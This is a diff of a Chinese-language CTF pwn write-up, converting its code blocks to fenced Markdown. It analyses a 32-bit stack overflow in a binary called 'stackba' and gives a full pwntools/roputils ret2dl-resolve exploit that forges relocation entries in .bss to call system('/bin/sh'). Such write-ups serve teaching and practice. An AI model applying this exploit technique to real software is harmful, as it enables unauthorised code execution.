@@ -14,56 +14,61 @@ tags:
 
 检查保护-NX被启用
 
-	root@kali:~# checksec stackba
-	[*] '/root/stackba'
-	    Arch:     i386-32-little
-	    RELRO:    Partial RELRO
-	    Stack:    No canary found
-	    NX:       NX enabled
-	    PIE:      No PIE (0x8048000)
-
+```python
+root@kali:~# checksec stackba
+[*] '/root/stackba'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
 
 
 main函数
 
-	int __cdecl main()
-	{
-	  alarm(0xAu);
-	  sub_804843B();
-	  return 0;
-	}
-
+```c
+int __cdecl main()
+{
+  alarm(0xAu);
+  sub_804843B();
+  return 0;
+}
+```
 sub_804843B()函数
 
-	ssize_t sub_804843B()
-	{
-	  char buf;  #[esp+0h] [ebp-28h]
-	  return read(0, &buf, 0x40u);
-	}
+```c
+ssize_t sub_804843B()
+{
+  char buf;  #[esp+0h] [ebp-28h]
+  return read(0, &buf, 0x40u);
+}
+```
 
 汇编代码
 
-	.text:0804843B sub_804843B     proc near               ; CODE XREF: main+1E↓p
-	.text:0804843B
-	.text:0804843B buf             = byte ptr -28h
-	.text:0804843B
-	.text:0804843B ; __unwind {
-	.text:0804843B                 push    ebp
-	.text:0804843C                 mov     ebp, esp
-	.text:0804843E                 sub     esp, 28h
-	.text:08048441                 sub     esp, 4
-	.text:08048444                 push    40h             ; nbytes
-	.text:08048446                 lea     eax, [ebp+buf]
-	.text:08048449                 push    eax             ; buf
-	.text:0804844A                 push    0               ; fd
-	.text:0804844C                 call    _read
-	.text:08048451                 add     esp, 10h
-	.text:08048454                 nop
-	.text:08048455                 leave
-	.text:08048456                 retn
-	.text:08048456 ; }  #starts at 804843B
-	.text:08048456 sub_804843B     endp
-
+```nasm
+.text:0804843B sub_804843B     proc near               ; CODE XREF: main+1E↓p
+.text:0804843B
+.text:0804843B buf             = byte ptr -28h
+.text:0804843B
+.text:0804843B ; __unwind {
+.text:0804843B                 push    ebp
+.text:0804843C                 mov     ebp, esp
+.text:0804843E                 sub     esp, 28h
+.text:08048441                 sub     esp, 4
+.text:08048444                 push    40h             ; nbytes
+.text:08048446                 lea     eax, [ebp+buf]
+.text:08048449                 push    eax             ; buf
+.text:0804844A                 push    0               ; fd
+.text:0804844C                 call    _read
+.text:08048451                 add     esp, 10h
+.text:08048454                 nop
+.text:08048455                 leave
+.text:08048456                 retn
+.text:08048456 ; }  #starts at 804843B
+.text:08048456 sub_804843B     endp
+```
 发现只开了一个栈不可执行，于是想构造rop链。但是整个文件搜索下来也没有发现什么有价值的gadget。pwn题一般都会提供一个libc文件用于泄露函数的地址，在这里使用一个不依赖于libc的溢出方法。
 
 ## 0x01 漏洞利用
@@ -74,35 +79,37 @@ sub_804843B()函数
 在bss段伪造Elf32_Rel 和 Elf32_Sym,二次调用劫持eip至plt[0]，解析system
 
 ## 0x02 完整exp
-	#!usr/bin/python
-	# -*- coding: utf-8 -*-
-	import roputils
-	from pwn import *
-	 
-	offset = 44
-	readplt = 0x08048300
-	bss = 0x0804a020
-	ret = 0x0804843B
-	 
-	p = process('./stackba')
-	 
-	rop = roputils.ROP('./stackba')
-	addr_bss = rop.section('.bss')
-	 
-	buf1 = 'A' * offset #44
-	buf1 += p32(readplt) + p32(ret) + p32(0) + p32(addr_bss) + p32(100)
-	p.send(buf1)
-	 
-	buf2 =  rop.string('/bin/sh')
-	buf2 += rop.fill(20, buf2)
-	buf2 += rop.dl_resolve_data(addr_bss+20,'system') #在bss段伪造Elf32_Rel 和 Elf32_Sym
-	buf2 += rop.fill(100, buf2)
-	p.send(buf2)
-	 
-	buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss) #劫持eip至plt[0]，解析system
-	p.send(buf3)
-	p.interactive()
 
+```python
+#!usr/bin/python
+# -*- coding: utf-8 -*-
+import roputils
+from pwn import *
+ 
+offset = 44
+readplt = 0x08048300
+bss = 0x0804a020
+ret = 0x0804843B
+ 
+p = process('./stackba')
+ 
+rop = roputils.ROP('./stackba')
+addr_bss = rop.section('.bss')
+ 
+buf1 = 'A' * offset #44
+buf1 += p32(readplt) + p32(ret) + p32(0) + p32(addr_bss) + p32(100)
+p.send(buf1)
+ 
+buf2 =  rop.string('/bin/sh')
+buf2 += rop.fill(20, buf2)
+buf2 += rop.dl_resolve_data(addr_bss+20,'system') #在bss段伪造Elf32_Rel 和 Elf32_Sym
+buf2 += rop.fill(100, buf2)
+p.send(buf2)
+ 
+buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss) #劫持eip至plt[0]，解析system
+p.send(buf3)
+p.interactive()
+```
 ## 0x03 运行结果
 
 ![pic1]
